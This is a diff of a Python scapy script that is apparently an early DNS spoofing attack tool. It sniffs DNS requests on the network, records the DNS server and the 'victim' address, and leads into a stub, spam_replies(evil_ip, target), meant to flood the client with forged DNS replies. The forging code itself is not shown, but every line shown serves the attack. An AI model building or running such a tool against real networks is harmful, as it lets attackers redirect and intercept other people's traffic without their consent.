@@ -5,22 +5,32 @@ import thread
 
 #sniff the traffic for at least a minute to try to capture DNS server
 def sniff_dns(sniff_time):
-	print "sniffing for DNS requests"
+	
+	#filter used to grab DNS packets
 	dns_filter = "dst port 53"
-
+	
 	#checking time to run the filter
 	if sniff_time==None:
 		sniff_time =300
 	else:
 		sniff_time = int(sniff_time)
-
-	sniff(prn=attack, store=1, timeout=sniff_time, filter=dns_filter)
 	
+	print "sniffing for DNS requests for " + str(sniff_time) + " seconds"
+	sniff(prn=attack, store=1, timeout=sniff_time, filter=dns_filter)
+	print "TIME IS UP"
 #packet breakdown
 def attack(packet):
-	a=packet
-	#debug statement to get names of fields
-	print ls(a)
+	ip_info=packet[IP]
+	dns_info=packet[DNS]
+	
+	#Get IP info
+	dns_server = ip_info.dst
+	victim = ip_info.src 
+
+	#Get UDP info
+
+	#Get DNS info
+	#print dns_info.qname
 
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
